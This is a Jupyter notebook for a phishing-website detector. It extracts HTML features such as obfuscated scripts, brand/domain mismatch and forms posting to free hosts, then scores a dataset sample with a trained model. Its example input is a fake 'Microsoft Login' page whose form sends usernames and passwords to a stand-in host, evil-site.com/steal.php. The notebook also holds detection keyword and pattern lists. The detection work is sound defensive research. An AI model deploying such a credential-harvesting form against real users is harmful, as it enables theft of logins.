{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "924f0939",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Prediction: LEGITIMATE\n",
      "Confidence: 99.10%\n"
     ]
    }
   ],
   "source": [
    "import pandas as pd\n",
    "import re\n",
    "from urllib.parse import urlparse\n",
    "from collections import Counter\n",
    "import numpy as np\n",
    "import math\n",
    "from typing import Dict, Optional\n",
    "import warnings\n",
    "\n",
    "warnings.filterwarnings(\"ignore\")\n",
    "\n",
    "\n",
    "# ============================================================================\n",
    "# CONSTANTS (Same as training)\n",
    "# ============================================================================\n",
    "\n",
    "BRAND_KEYWORDS = {\n",
    "    \"microsoft\": [\"microsoft.com\", \"office.com\", \"outlook.com\", \"live.com\"],\n",
    "    \"google\": [\"google.com\", \"gmail.com\"],\n",
    "    \"apple\": [\"apple.com\", \"icloud.com\"],\n",
    "    \"paypal\": [\"paypal.com\"],\n",
    "    \"facebook\": [\"facebook.com\", \"fb.com\"],\n",
    "    \"amazon\": [\"amazon.com\"],\n",
    "    \"netflix\": [\"netflix.com\"],\n",
    "    \"dropbox\": [\"dropbox.com\"],\n",
    "    \"adobe\": [\"adobe.com\"],\n",
    "    \"linkedin\": [\"linkedin.com\"],\n",
    "    \"twitter\": [\"twitter.com\", \"x.com\"],\n",
    "    \"instagram\": [\"instagram.com\"],\n",
    "    \"ebay\": [\"ebay.com\"],\n",
    "    \"wells fargo\": [\"wellsfargo.com\"],\n",
    "    \"chase\": [\"chase.com\"],\n",
    "    \"bank of america\": [\"bankofamerica.com\"],\n",
    "}\n",
    "\n",
    "FREE_HOSTING_DOMAINS = [\n",
    "    \"000webhost\",\n",
    "    \"firebaseapp\",\n",
    "    \"formspree\",\n",
    "    \"herokuapp\",\n",
    "    \"netlify.app\",\n",
    "    \"github.io\",\n",
    "    \"gitlab.io\",\n",
    "    \"weebly.com\",\n",
    "    \"wix.com\",\n",
    "    \"wordpress.com\",\n",
    "    \"blogspot.com\",\n",
    "    \"tumblr.com\",\n",
    "    \"surge.sh\",\n",
    "    \"vercel.app\",\n",
    "    \"pages.dev\",\n",
    "    \"infinityfree\",\n",
    "    \"freehosting\",\n",
    "    \"rf.gd\",\n",
    "    \"ucoz.\",\n",
    "]\n",
    "\n",
    "PHISHING_KEYWORDS = [\n",
    "    \"verify\",\n",
    "    \"account\",\n",
    "    \"suspended\",\n",
    "    \"confirm\",\n",
    "    \"update\",\n",
    "    \"secure\",\n",
    "    \"login\",\n",
    "    \"password\",\n",
    "    \"urgent\",\n",
    "    \"immediately\",\n",
    "    \"expire\",\n",
    "    \"limited\",\n",
    "]\n",
    "\n",
    "\n",
    "# ============================================================================\n",
    "# PREPROCESSING FUNCTIONS\n",
    "# ============================================================================\n",
    "\n",
    "\n",
    "def remove_surrogates(text: str) -> str:\n",
    "    \"\"\"Remove unpaired surrogate characters to prevent encoding errors\"\"\"\n",
    "    try:\n",
    "        return text.encode(\"utf-8\", errors=\"surrogatepass\").decode(\n",
    "            \"utf-8\", errors=\"ignore\"\n",
    "        )\n",
    "    except:\n",
    "        return re.sub(r\"[\\ud800-\\udfff]\", \"\", text)\n",
    "\n",
    "\n",
    "def remove_html_comments(text: str) -> str:\n",
    "    \"\"\"Remove HTML comments using regex (preserves raw HTML structure)\"\"\"\n",
    "    return re.sub(r\"<!--.*?-->\", \"\", text, flags=re.DOTALL)\n",
    "\n",
    "\n",
    "def preprocess_html(html_code: str) -> str:\n",
    "    \"\"\"\n",
    "    Preprocess HTML code (same as training preprocessing).\n",
    "\n",
    "    Steps:\n",
    "    1. Remove surrogates (prevents crashes)\n",
    "    2. Remove HTML comments (pure noise)\n",
    "    3. Normalize whitespace (reduces noise)\n",
    "    \"\"\"\n",
    "    if pd.isna(html_code) or html_code == \"\":\n",
    "        return \"\"\n",
    "\n",
    "    try:\n",
    "        text = str(html_code)\n",
    "        text = remove_surrogates(text)\n",
    "        text = remove_html_comments(text)\n",
    "        text = re.sub(r\"\\n\\s*\\n\", \"\\n\", text)\n",
    "        text = re.sub(r\"[ \\t]+\", \" \", text)\n",
    "        text = text.strip()\n",
    "        return text\n",
    "    except Exception as e:\n",
    "        print(f\"Error preprocessing: {str(e)}\")\n",
    "        return html_code\n",
    "\n",
    "\n",
    "# ============================================================================\n",
    "# UTILITY FUNCTIONS\n",
    "# ============================================================================\n",
    "\n",
    "\n",
    "def safe_divide(numerator: float, denominator: float, default: float = 0.0) -> float:\n",
    "    \"\"\"Safely divide two numbers, returning default if denominator is 0\"\"\"\n",
    "    return numerator / denominator if denominator != 0 else default\n",
    "\n",
    "\n",
    "def extract_domain(url: Optional[str]) -> str:\n",
    "    \"\"\"Extract domain from URL safely\"\"\"\n",
    "    if not url:\n",
    "        return \"\"\n",
    "    try:\n",
    "        return urlparse(url).netloc.lower()\n",
    "    except:\n",
    "        return \"\"\n",
    "\n",
    "\n",
    "def calculate_shannon_entropy(text: str) -> float:\n",
    "    \"\"\"Calculate Shannon entropy (measure of randomness/obfuscation)\"\"\"\n",
    "    if not text:\n",
    "        return 0.0\n",
    "    counter = Counter(text)\n",
    "    length = len(text)\n",
    "    entropy = 0.0\n",
    "    for count in counter.values():\n",
    "        probability = count / length\n",
    "        entropy -= probability * math.log2(probability)\n",
    "    return entropy\n",
    "\n",
    "\n",
    "def extract_all_scripts(html: str) -> str:\n",
    "    \"\"\"Extract and concatenate all script content\"\"\"\n",
    "    scripts = re.findall(r\"<script[^>]*>(.*?)</script>\", html, re.DOTALL | re.I)\n",
    "    return \"\\n\".join(scripts)\n",
    "\n",
    "\n",
    "def get_text_content(html: str) -> str:\n",
    "    \"\"\"Remove all HTML tags to get plain text\"\"\"\n",
    "    return re.sub(r\"<[^>]+>\", \" \", html)\n",
    "\n",
    "\n",
    "# ============================================================================\n",
    "# FEATURE EXTRACTION FUNCTIONS (Same as training)\n",
    "# ============================================================================\n",
    "\n",
    "\n",
    "def extract_structural_features(html: str) -> Dict[str, float]:\n",
    "    \"\"\"Extract DOM structure and complexity features\"\"\"\n",
    "    features = {}\n",
    "    features[\"total_tags\"] = len(re.findall(r\"<[^>]+>\", html))\n",
    "    features[\"div_count\"] = html.count(\"<div\")\n",
    "    features[\"script_count\"] = html.count(\"<script\")\n",
    "    features[\"iframe_count\"] = html.count(\"<iframe\")\n",
    "    features[\"form_count\"] = html.count(\"<form\")\n",
    "    features[\"input_count\"] = html.count(\"<input\")\n",
    "    features[\"a_tag_count\"] = html.count(\"<a \")\n",
    "    features[\"img_count\"] = html.count(\"<img\")\n",
    "    features[\"meta_count\"] = html.count(\"<meta\")\n",
    "\n",
    "    max_depth = 0\n",
    "    current_depth = 0\n",
    "    for char in html:\n",
    "        if char == \"<\":\n",
    "            current_depth += 1\n",
    "            max_depth = max(max_depth, current_depth)\n",
    "        elif char == \">\":\n",
    "            current_depth = max(0, current_depth - 1)\n",
    "    features[\"max_nesting_depth\"] = max_depth\n",
    "\n",
    "    opening_tags = len(re.findall(r\"<(?!/)(?!!)[a-zA-Z][^>]*>\", html))\n",
    "    closing_tags = len(re.findall(r\"</[a-zA-Z][^>]*>\", html))\n",
    "    features[\"unclosed_tags\"] = abs(opening_tags - closing_tags)\n",
    "    features[\"has_doctype\"] = 1 if \"<!DOCTYPE\" in html.upper() else 0\n",
    "    features[\"html_length\"] = len(html)\n",
    "    features[\"html_length_log\"] = np.log1p(len(html))\n",
    "\n",
    "    return features\n",
    "\n",
    "\n",
    "def extract_form_features(html: str) -> Dict[str, float]:\n",
    "    \"\"\"Extract features related to forms and inputs\"\"\"\n",
    "    features = {}\n",
    "    features[\"password_field_count\"] = len(\n",
    "        re.findall(r'type\\s*=\\s*[\"\\']password[\"\\']', html, re.I)\n",
    "    )\n",
    "    features[\"email_field_count\"] = len(\n",
    "        re.findall(r'type\\s*=\\s*[\"\\']email[\"\\']', html, re.I)\n",
    "    )\n",
    "    features[\"text_input_count\"] = len(\n",
    "        re.findall(r'type\\s*=\\s*[\"\\']text[\"\\']', html, re.I)\n",
    "    )\n",
    "    features[\"hidden_input_count\"] = len(\n",
    "        re.findall(r'type\\s*=\\s*[\"\\']hidden[\"\\']', html, re.I)\n",
    "    )\n",
    "    features[\"submit_button_count\"] = len(\n",
    "        re.findall(r'type\\s*=\\s*[\"\\']submit[\"\\']', html, re.I)\n",
    "    )\n",
    "\n",
    "    form_actions = re.findall(r'action\\s*=\\s*[\"\\']([^\"\\']+)[\"\\']', html, re.I)\n",
    "    features[\"form_has_external_action\"] = 0\n",
    "    features[\"form_action_suspicious\"] = 0\n",
    "    for action in form_actions:\n",
    "        if action.startswith(\"http\"):\n",
    "            features[\"form_has_external_action\"] = 1\n",
    "        if \".php\" in action.lower():\n",
    "            features[\"form_action_suspicious\"] = 1\n",
    "\n",
    "    return features\n",
    "\n",
    "\n",
    "def extract_script_features(html: str) -> Dict[str, float]:\n",
    "    \"\"\"Extract JavaScript and obfuscation features\"\"\"\n",
    "    features = {}\n",
    "    all_scripts = extract_all_scripts(html)\n",
    "    features[\"total_script_length\"] = len(all_scripts)\n",
    "    features[\"has_eval\"] = 1 if \"eval(\" in all_scripts else 0\n",
    "    features[\"has_unescape\"] = 1 if \"unescape(\" in all_scripts else 0\n",
    "    features[\"has_document_write\"] = 1 if \"document.write\" in all_scripts else 0\n",
    "    features[\"has_settimeout\"] = 1 if \"setTimeout\" in all_scripts else 0\n",
    "    features[\"has_setinterval\"] = 1 if \"setInterval\" in all_scripts else 0\n",
    "    features[\"has_unicode_escape\"] = 1 if re.search(r\"\\\\u[0-9a-fA-F]{4}\", html) else 0\n",
    "    features[\"has_hex_escape\"] = 1 if re.search(r\"\\\\x[0-9a-fA-F]{2}\", html) else 0\n",
    "    features[\"has_base64\"] = 1 if re.search(r\"atob\\s*\\(\", all_scripts) else 0\n",
    "    features[\"has_packed_js\"] = (\n",
    "        1 if re.search(r\"eval\\s*\\(\\s*function\\s*\\(\", all_scripts) else 0\n",
    "    )\n",
    "    features[\"has_charcodeat\"] = 1 if \"charCodeAt\" in all_scripts else 0\n",
    "    features[\"has_fromcharcode\"] = 1 if \"fromCharCode\" in all_scripts else 0\n",
    "    features[\"unicode_escape_count\"] = len(re.findall(r\"\\\\u[0-9a-fA-F]{4}\", html))\n",
    "    features[\"url_encoding_count\"] = len(re.findall(r\"%[0-9a-fA-F]{2}\", html))\n",
    "    features[\"js_entropy\"] = (\n",
    "        calculate_shannon_entropy(all_scripts) if all_scripts else 0.0\n",
    "    )\n",
    "    features[\"high_entropy_js\"] = 1 if features[\"js_entropy\"] > 5.0 else 0\n",
    "    return features\n",
    "\n",
    "\n",
    "def extract_url_features(html: str, page_url: Optional[str] = None) -> Dict[str, float]:\n",
    "    \"\"\"Extract features from URLs and links\"\"\"\n",
    "    features = {}\n",
    "    hrefs = re.findall(r'href\\s*=\\s*[\"\\']([^\"\\']+)[\"\\']', html, re.I)\n",
    "    features[\"total_links\"] = len(hrefs)\n",
    "    features[\"external_links\"] = 0\n",
    "    features[\"suspicious_tld_count\"] = 0\n",
    "    features[\"ip_in_url\"] = 0\n",
    "\n",
    "    suspicious_tlds = [\".tk\", \".ml\", \".ga\", \".cf\", \".gq\", \".info\", \".xyz\"]\n",
    "    for href in hrefs:\n",
    "        if href.startswith(\"http\"):\n",
    "            features[\"external_links\"] += 1\n",
    "            if any(tld in href.lower() for tld in suspicious_tlds):\n",
    "                features[\"suspicious_tld_count\"] += 1\n",
    "            if re.search(r\"https?://\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\", href):\n",
    "                features[\"ip_in_url\"] = 1\n",
    "\n",
    "    features[\"external_resources\"] = len(re.findall(r'src\\s*=\\s*[\"\\']http', html, re.I))\n",
    "\n",
    "    link_patterns = re.findall(\n",
    "        r'<a[^>]+href\\s*=\\s*[\"\\']([^\"\\']+)[\"\\'][^>]*>([^<]*)</a>', html, re.I\n",
    "    )\n",
    "    features[\"url_text_mismatch\"] = 0\n",
    "    for url, text in link_patterns:\n",
    "        text_clean = text.strip().lower()\n",
    "        if re.search(r\"[a-z0-9-]+\\.(com|net|org)\", text_clean) and url.startswith(\n",
    "            \"http\"\n",
    "        ):\n",
    "            if text_clean not in url.lower():\n",
    "                features[\"url_text_mismatch\"] = 1\n",
    "                break\n",
    "\n",
    "    return features\n",
    "\n",
    "\n",
    "def extract_visual_features(html: str) -> Dict[str, float]:\n",
    "    \"\"\"Analyze visual layout patterns\"\"\"\n",
    "    features = {}\n",
    "    img_tags = re.findall(r\"<img[^>]*>\", html, re.I)\n",
    "    total_img_area = 0\n",
    "    for img in img_tags:\n",
    "        width = re.search(r'width\\s*=\\s*[\"\\']?(\\d+)', img, re.I)\n",
    "        height = re.search(r'height\\s*=\\s*[\"\\']?(\\d+)', img, re.I)\n",
    "        if width and height:\n",
    "            total_img_area += int(width.group(1)) * int(height.group(1))\n",
    "\n",
    "    text_length = len(get_text_content(html).strip())\n",
    "    features[\"total_image_area\"] = total_img_area\n",
    "    features[\"image_to_text_ratio\"] = safe_divide(total_img_area, text_length)\n",
    "    features[\"high_image_to_text\"] = 1 if features[\"image_to_text_ratio\"] > 100 else 0\n",
    "\n",
    "    z_indices = [int(z) for z in re.findall(r\"z-index\\s*:\\s*(\\d+)\", html, re.I)]\n",
    "    features[\"max_z_index\"] = max(z_indices) if z_indices else 0\n",
    "    features[\"z_index_range\"] = (\n",
    "        max(z_indices) - min(z_indices) if len(z_indices) > 1 else 0\n",
    "    )\n",
    "    features[\"high_z_index_elements\"] = sum(1 for z in z_indices if z > 100)\n",
    "    features[\"absolute_position_count\"] = len(\n",
    "        re.findall(r\"position\\s*:\\s*absolute\", html, re.I)\n",
    "    )\n",
    "    features[\"overlay_pattern\"] = (\n",
    "        1\n",
    "        if (features[\"absolute_position_count\"] > 3 and features[\"max_z_index\"] > 10)\n",
    "        else 0\n",
    "    )\n",
    "    features[\"font_size_zero\"] = len(re.findall(r\"font-size\\s*:\\s*0\", html, re.I))\n",
    "    features[\"opacity_zero\"] = len(re.findall(r\"opacity\\s*:\\s*0\", html, re.I))\n",
    "    features[\"negative_position\"] = len(\n",
    "        re.findall(r\"(left|top)\\s*:\\s*-\\d{3,}px\", html, re.I)\n",
    "    )\n",
    "    features[\"display_none\"] = len(re.findall(r\"display\\s*:\\s*none\", html, re.I))\n",
    "    features[\"hidden_text_techniques\"] = (\n",
    "        features[\"font_size_zero\"]\n",
    "        + features[\"opacity_zero\"]\n",
    "        + features[\"negative_position\"]\n",
    "    )\n",
    "\n",
    "    return features\n",
    "\n",
    "\n",
    "def extract_behavioral_features(html: str) -> Dict[str, float]:\n",
    "    \"\"\"Detect suspicious behavioral patterns\"\"\"\n",
    "    features = {}\n",
    "    all_scripts = extract_all_scripts(html)\n",
    "    features[\"delayed_password_reveal\"] = (\n",
    "        1\n",
    "        if re.search(r\"setTimeout.*type.*password\", all_scripts, re.I | re.DOTALL)\n",
    "        else 0\n",
    "    )\n",
    "\n",
    "    dom_patterns = [\n",
    "        r\"setTimeout.*innerHTML\",\n",
    "        r\"setTimeout.*createElement\",\n",
    "        r\"setTimeout.*appendChild\",\n",
    "        r\"setInterval.*style\",\n",
    "    ]\n",
    "    features[\"delayed_dom_modification\"] = sum(\n",
    "        1 for p in dom_patterns if re.search(p, all_scripts, re.I | re.DOTALL)\n",
    "    )\n",
    "\n",
    "    security_patterns = [\n",
    "        r\"keydown.*preventDefault\",\n",
    "        r\"keypress.*preventDefault\",\n",
    "        r\"contextmenu.*preventDefault\",\n",
    "        r\"F12.*preventDefault\",\n",
    "        r\"inspect.*preventDefault\",\n",
    "        r\"Ctrl.*U.*preventDefault\",\n",
    "    ]\n",
    "    features[\"blocks_security_hotkeys\"] = sum(\n",
    "        1 for p in security_patterns if re.search(p, all_scripts, re.I)\n",
    "    )\n",
    "\n",
    "    return features\n",
    "\n",
    "\n",
    "def extract_identity_features(\n",
    "    html: str, page_url: Optional[str] = None\n",
    ") -> Dict[str, float]:\n",
    "    \"\"\"Check for identity and brand mismatches\"\"\"\n",
    "    features = {}\n",
    "    domain = extract_domain(page_url)\n",
    "    text_content = get_text_content(html).lower()\n",
    "\n",
    "    mentioned_brands = [\n",
    "        brand for brand in BRAND_KEYWORDS.keys() if brand in text_content\n",
    "    ]\n",
    "    features[\"brand_mention_count\"] = len(mentioned_brands)\n",
    "    features[\"domain_brand_mismatch\"] = 0\n",
    "    if domain and mentioned_brands:\n",
    "        domain_matches = any(\n",
    "            any(official in domain for official in BRAND_KEYWORDS[brand])\n",
    "            for brand in mentioned_brands\n",
    "        )\n",
    "        features[\"domain_brand_mismatch\"] = 0 if domain_matches else 1\n",
    "\n",
    "    form_actions = re.findall(r'action\\s*=\\s*[\"\\']([^\"\\']+)[\"\\']', html, re.I)\n",
    "    features[\"form_action_to_free_host\"] = 0\n",
    "    features[\"form_action_different_domain\"] = 0\n",
    "    for action in form_actions:\n",
    "        if any(free_host in action.lower() for free_host in FREE_HOSTING_DOMAINS):\n",
    "            features[\"form_action_to_free_host\"] = 1\n",
    "        if action.startswith(\"http\") and domain:\n",
    "            action_domain = extract_domain(action)\n",
    "            if action_domain and action_domain != domain:\n",
    "                features[\"form_action_different_domain\"] = 1\n",
    "\n",
    "    features[\"has_favicon\"] = (\n",
    "        1 if re.search(r'rel\\s*=\\s*[\"\\'][^\"\\']*icon[^\"\\']*[\"\\']', html, re.I) else 0\n",
    "    )\n",
    "    favicon_urls = re.findall(\n",
    "        r'rel\\s*=\\s*[\"\\'][^\"\\']*icon[^\"\\']*[\"\\'][^>]*href\\s*=\\s*[\"\\']([^\"\\']+)[\"\\']',\n",
    "        html,\n",
    "        re.I,\n",
    "    )\n",
    "    features[\"favicon_external\"] = 0\n",
    "    if favicon_urls and domain:\n",
    "        features[\"favicon_external\"] = (\n",
    "            1\n",
    "            if any(f.startswith(\"http\") and domain not in f for f in favicon_urls)\n",
    "            else 0\n",
    "        )\n",
    "\n",
    "    return features\n",
    "\n",
    "\n",
    "def extract_semantic_features(\n",
    "    html: str, page_url: Optional[str] = None\n",
    ") -> Dict[str, float]:\n",
    "    \"\"\"Analyze semantic relationships in the DOM\"\"\"\n",
    "    features = {}\n",
    "    text_with_brands = [\n",
    "        brand for brand in BRAND_KEYWORDS.keys() if brand in html.lower()\n",
    "    ]\n",
    "    features[\"brands_near_password_field\"] = 0\n",
    "\n",
    "    if text_with_brands:\n",
    "        password_positions = [\n",
    "            m.start() for m in re.finditer(r'type\\s*=\\s*[\"\\']password[\"\\']', html, re.I)\n",
    "        ]\n",
    "        for brand in text_with_brands:\n",
    "            brand_positions = [m.start() for m in re.finditer(brand, html, re.I)]\n",
    "            for p_pos in password_positions:\n",
    "                for b_pos in brand_positions:\n",
    "                    if abs(p_pos - b_pos) < 500:\n",
    "                        features[\"brands_near_password_field\"] = 1\n",
    "                        break\n",
    "\n",
    "    title_match = re.search(r\"<title[^>]*>([^<]+)</title>\", html, re.I)\n",
    "    features[\"title_has_brand\"] = 0\n",
    "    features[\"brand_password_distance\"] = 0\n",
    "    features[\"brand_password_far\"] = 0\n",
    "    if title_match:\n",
    "        title_text = title_match.group(1).lower()\n",
    "        title_has_brand = any(brand in title_text for brand in BRAND_KEYWORDS.keys())\n",
    "        features[\"title_has_brand\"] = 1 if title_has_brand else 0\n",
    "        if title_has_brand and re.search(r'type\\s*=\\s*[\"\\']password[\"\\']', html, re.I):\n",
    "            title_pos = title_match.start()\n",
    "            password_positions = [\n",
    "                m.start()\n",
    "                for m in re.finditer(r'type\\s*=\\s*[\"\\']password[\"\\']', html, re.I)\n",
    "            ]\n",
    "            min_distance = min(abs(title_pos - p_pos) for p_pos in password_positions)\n",
    "            features[\"brand_password_distance\"] = min_distance\n",
    "            features[\"brand_password_far\"] = 1 if min_distance > 2000 else 0\n",
    "\n",
    "    domain = extract_domain(page_url)\n",
    "    all_resources = []\n",
    "    all_resources.extend(re.findall(r'src\\s*=\\s*[\"\\']([^\"\\']+)[\"\\']', html, re.I))\n",
    "    all_resources.extend(\n",
    "        re.findall(r'href\\s*=\\s*[\"\\']([^\"\\']+\\.css[^\"\\']*)[\"\\']', html, re.I)\n",
    "    )\n",
    "    all_resources.extend(\n",
    "        re.findall(r'<script[^>]+src\\s*=\\s*[\"\\']([^\"\\']+)[\"\\']', html, re.I)\n",
    "    )\n",
    "    external_resources = [r for r in all_resources if r.startswith(\"http\")]\n",
    "\n",
    "    features[\"total_resources\"] = len(all_resources)\n",
    "    features[\"external_resources\"] = len(external_resources)\n",
    "    features[\"official_brand_resources\"] = 0\n",
    "    features[\"ratio_official_assets\"] = 0\n",
    "    features[\"hotlinking_official_assets\"] = 0\n",
    "\n",
    "    if external_resources:\n",
    "        for resource in external_resources:\n",
    "            resource_lower = resource.lower()\n",
    "            for brand, official_domains in BRAND_KEYWORDS.items():\n",
    "                if any(official in resource_lower for official in official_domains):\n",
    "                    features[\"official_brand_resources\"] += 1\n",
    "                    break\n",
    "        features[\"ratio_official_assets\"] = safe_divide(\n",
    "            features[\"official_brand_resources\"], len(external_resources)\n",
    "        )\n",
    "        if features[\"ratio_official_assets\"] > 0.5 and domain:\n",
    "            is_official = any(\n",
    "                any(official in domain for official in domains)\n",
    "                for domains in BRAND_KEYWORDS.values()\n",
    "            )\n",
    "            features[\"hotlinking_official_assets\"] = 0 if is_official else 1\n",
    "\n",
    "    return features\n",
    "\n",
    "\n",
    "def extract_content_features(html: str) -> Dict[str, float]:\n",
    "    \"\"\"Extract features from visible text and keywords\"\"\"\n",
    "    features = {}\n",
    "    text = get_text_content(html).lower()\n",
    "    features[\"text_length\"] = len(text)\n",
    "    features[\"word_count\"] = len(text.split())\n",
    "    features[\"phishing_keyword_count\"] = sum(\n",
    "        1 for keyword in PHISHING_KEYWORDS if keyword in text\n",
    "    )\n",
    "    features[\"exclamation_count\"] = text.count(\"!\")\n",
    "    features[\"question_count\"] = text.count(\"?\")\n",
    "    features[\"special_char_ratio\"] = safe_divide(\n",
    "        len(re.findall(r\"[^a-zA-Z0-9\\s]\", text)), len(text)\n",
    "    )\n",
    "    return features\n",
    "\n",
    "\n",
    "# ============================================================================\n",
    "# MAIN PIPELINE FUNCTION\n",
    "# ============================================================================\n",
    "\n",
    "\n",
    "def process_webpage_for_prediction(\n",
    "    webpage_code: str, url: Optional[str] = None\n",
    ") -> pd.DataFrame:\n",
    "    \"\"\"\n",
    "    Complete pipeline: Preprocess HTML and extract all 79 features.\n",
    "    Returns a DataFrame with one row ready for model prediction.\n",
    "\n",
    "    Args:\n",
    "        webpage_code: Raw HTML code as string\n",
    "        url: Optional URL of the webpage\n",
    "\n",
    "    Returns:\n",
    "        DataFrame with one row containing all 79 features in correct order\n",
    "    \"\"\"\n",
    "    try:\n",
    "        # Step 1: Preprocess HTML (same as training)\n",
    "        preprocessed_html = preprocess_html(webpage_code)\n",
    "\n",
    "        # Step 2: Extract all features\n",
    "        features = {}\n",
    "        features.update(extract_structural_features(preprocessed_html))\n",
    "        features.update(extract_form_features(preprocessed_html))\n",
    "        features.update(extract_script_features(preprocessed_html))\n",
    "        features.update(extract_url_features(preprocessed_html, url))\n",
    "        features.update(extract_visual_features(preprocessed_html))\n",
    "        features.update(extract_behavioral_features(preprocessed_html))\n",
    "        features.update(extract_identity_features(preprocessed_html, url))\n",
    "        features.update(extract_semantic_features(preprocessed_html, url))\n",
    "        features.update(extract_content_features(preprocessed_html))\n",
    "\n",
    "        # Step 3: Convert to DataFrame\n",
    "        df = pd.DataFrame([features])\n",
    "\n",
    "        return df\n",
    "\n",
    "    except Exception as e:\n",
    "        print(f\"Error in pipeline: {str(e)}\")\n",
    "        # Return empty DataFrame with all feature columns as 0\n",
    "        empty_features = {f: 0 for f in get_feature_names()}\n",
    "        return pd.DataFrame([empty_features])\n",
    "\n",
    "\n",
    "def get_feature_names() -> list:\n",
    "    \"\"\"Return list of all 79 feature names in the correct order (same as training)\"\"\"\n",
    "    return [\n",
    "        \"total_tags\",\n",
    "        \"div_count\",\n",
    "        \"script_count\",\n",
    "        \"iframe_count\",\n",
    "        \"form_count\",\n",
    "        \"input_count\",\n",
    "        \"a_tag_count\",\n",
    "        \"img_count\",\n",
    "        \"meta_count\",\n",
    "        \"max_nesting_depth\",\n",
    "        \"unclosed_tags\",\n",
    "        \"has_doctype\",\n",
    "        \"html_length\",\n",
    "        \"html_length_log\",\n",
    "        \"password_field_count\",\n",
    "        \"email_field_count\",\n",
    "        \"text_input_count\",\n",
    "        \"hidden_input_count\",\n",
    "        \"submit_button_count\",\n",
    "        \"form_has_external_action\",\n",
    "        \"form_action_suspicious\",\n",
    "        \"total_script_length\",\n",
    "        \"has_eval\",\n",
    "        \"has_unescape\",\n",
    "        \"has_document_write\",\n",
    "        \"has_settimeout\",\n",
    "        \"has_setinterval\",\n",
    "        \"has_unicode_escape\",\n",
    "        \"has_hex_escape\",\n",
    "        \"has_base64\",\n",
    "        \"has_packed_js\",\n",
    "        \"has_charcodeat\",\n",
    "        \"has_fromcharcode\",\n",
    "        \"unicode_escape_count\",\n",
    "        \"url_encoding_count\",\n",
    "        \"js_entropy\",\n",
    "        \"high_entropy_js\",\n",
    "        \"total_links\",\n",
    "        \"external_links\",\n",
    "        \"suspicious_tld_count\",\n",
    "        \"ip_in_url\",\n",
    "        \"external_resources\",\n",
    "        \"url_text_mismatch\",\n",
    "        \"total_image_area\",\n",
    "        \"image_to_text_ratio\",\n",
    "        \"high_image_to_text\",\n",
    "        \"max_z_index\",\n",
    "        \"z_index_range\",\n",
    "        \"high_z_index_elements\",\n",
    "        \"absolute_position_count\",\n",
    "        \"overlay_pattern\",\n",
    "        \"font_size_zero\",\n",
    "        \"opacity_zero\",\n",
    "        \"negative_position\",\n",
    "        \"display_none\",\n",
    "        \"hidden_text_techniques\",\n",
    "        \"delayed_password_reveal\",\n",
    "        \"delayed_dom_modification\",\n",
    "        \"blocks_security_hotkeys\",\n",
    "        \"brand_mention_count\",\n",
    "        \"domain_brand_mismatch\",\n",
    "        \"form_action_to_free_host\",\n",
    "        \"form_action_different_domain\",\n",
    "        \"has_favicon\",\n",
    "        \"favicon_external\",\n",
    "        \"brands_near_password_field\",\n",
    "        \"title_has_brand\",\n",
    "        \"brand_password_distance\",\n",
    "        \"brand_password_far\",\n",
    "        \"total_resources\",\n",
    "        \"external_resources\",\n",
    "        \"official_brand_resources\",\n",
    "        \"ratio_official_assets\",\n",
    "        \"hotlinking_official_assets\",\n",
    "        \"text_length\",\n",
    "        \"word_count\",\n",
    "        \"phishing_keyword_count\",\n",
    "        \"exclamation_count\",\n",
    "        \"question_count\",\n",
    "        \"special_char_ratio\",\n",
    "    ]\n",
    "\n",
    "\n",
    "# ============================================================================\n",
    "# EXAMPLE USAGE\n",
    "# ============================================================================\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    # Example: Process a webpage\n",
    "    sample_html = \"\"\"\n",
    "    <!DOCTYPE html>\n",
    "    <html>\n",
    "    <head><title>Microsoft Login</title></head>\n",
    "    <body>\n",
    "        <form action=\"http://evil-site.com/steal.php\" method=\"post\">\n",
    "            <input type=\"text\" name=\"username\">\n",
    "            <input type=\"password\" name=\"pass\">\n",
    "            <input type=\"submit\">\n",
    "        </form>\n",
    "        <script>\n",
    "            setTimeout(function() {\n",
    "                document.getElementsByTagName('input')[1].type = \"password\"\n",
    "            }, 1000);\n",
    "        </script>\n",
    "    </body>\n",
    "    </html>\n",
    "    \"\"\"\n",
    "\n",
    "\n",
    "import joblib\n",
    "\n",
    "# Load your trained model\n",
    "model = joblib.load(\n",
    "    \"/home/maliha/Programming/dm/Phishing-Website-Classifier/training/utilities/webcode/best_phishing_model_webcode.pkl\"\n",
    ")\n",
    "scaler = joblib.load(\n",
    "    \"/home/maliha/Programming/dm/Phishing-Website-Classifier/training/utilities/webcode/feature_scaler_webcode.pkl\"\n",
    ")  # if you used scaling\n",
    "\n",
    "\n",
    "# Process new HTML\n",
    "import pandas as pd\n",
    "\n",
    "df = pd.read_csv(\n",
    "    \"/home/maliha/Programming/dm/Phishing-Website-Classifier/phishing_complete_dataset.csv\",\n",
    "    nrows=100,\n",
    ")\n",
    "\n",
    "\n",
    "# Get the first phishing sample (result == 1)\n",
    "phishing_sample = df[df[\"result\"] == 0].iloc[6]\n",
    "new_html = phishing_sample[\"webpage_code\"]\n",
    "new_url = phishing_sample[\"url\"]\n",
    "\n",
    "features_df = process_webpage_for_prediction(new_html, new_url)\n",
    "\n",
    "# Apply same preprocessing as training\n",
    "\n",
    "\n",
    "if scaler:\n",
    "    features_df = pd.DataFrame(\n",
    "        scaler.transform(features_df), columns=features_df.columns\n",
    "    )\n",
    "\n",
    "# Predict\n",
    "prediction = model.predict(features_df)[0]\n",
    "probability = model.predict_proba(features_df)[0]\n",
    "\n",
    "print(f\"Prediction: {'PHISHING' if prediction == 1 else 'LEGITIMATE'}\")\n",
    "print(f\"Confidence: {probability[prediction]:.2%}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "71d301ec",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "\n",
    "df = pd.read_csv(\n",
    "    \"/home/maliha/Programming/dm/Phishing-Website-Classifier/phishing_complete_dataset.csv\",\n",
    "    nrows=100,\n",
    ")\n",
    "\n",
    "new_df = df[df[\"result\"] == 1]\n",
    "\n",
    "new_df.to_csv(\"/home/maliha/Programming/dm/Phishing-Website-Classifier/phsing.csv\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
